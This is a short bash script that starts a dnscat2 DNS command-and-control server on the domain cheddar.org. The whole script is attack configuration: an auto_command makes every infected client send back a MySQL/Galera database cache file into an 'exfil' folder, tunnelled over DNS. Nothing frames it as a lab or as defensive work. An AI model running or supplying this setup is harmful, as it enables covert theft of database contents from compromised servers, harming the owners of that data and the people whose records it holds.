#!/usr/bin/env bash

ruby ./dnscat2.rb cheddar.org
set passthrough=8.8.8.8:53
set auto_command=download /var/lib/mysql/galera.cache ./exfil; delay 5
window -i dns1